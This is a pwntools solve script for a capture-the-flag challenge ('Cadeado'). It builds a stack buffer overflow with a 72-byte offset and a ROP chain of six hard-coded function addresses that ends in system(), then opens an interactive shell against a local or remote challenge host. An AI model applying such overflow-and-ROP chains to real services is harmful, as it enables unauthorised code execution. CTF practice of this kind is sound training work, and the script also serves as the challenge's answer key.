#!/usr/bin/env python3
# Cadeado - PWN - ret2win / ROP de ordenacao dos pinos
# Uso:
#   LOCAL : python3 solve.py
#   REMOTO: python3 solve.py remote
from pwn import *

context.binary = elf = ELF("./dist/pwn")
context.log_level = "info"

# --- enderecos (No PIE, fixos) ---
pino_3 = 0x401268
pino_5 = 0x40128c
pino_4 = 0x4012bf
pino_1 = 0x4012f2
pino_2 = 0x401325
verificar = 0x4013b7

# buffer em rbp-0x40 (64) + rbp salvo (8) = 72
OFFSET = 72

# ordem forcada pelos guards de cada pino (senao pulou_pino -> exit):
#   pino_3(livre) -> pino_5 -> pino_4 -> pino_1 -> pino_2(seta comando) -> verificar
# pilha ja fica 16-alinhada no system(); NAO inserir 'ret' extra (desalinha).
chain = flat(
    b"A" * OFFSET,
    pino_3,
    pino_5,
    pino_4,
    pino_1,
    pino_2,
    verificar,
)

if "remote" in sys.argv:
    io = remote("pwn.<DOMAIN>", 9605)
else:
    io = elf.process()

io.sendlineafter(b":", chain)   # prompt "Vai despinando:"
io.interactive()
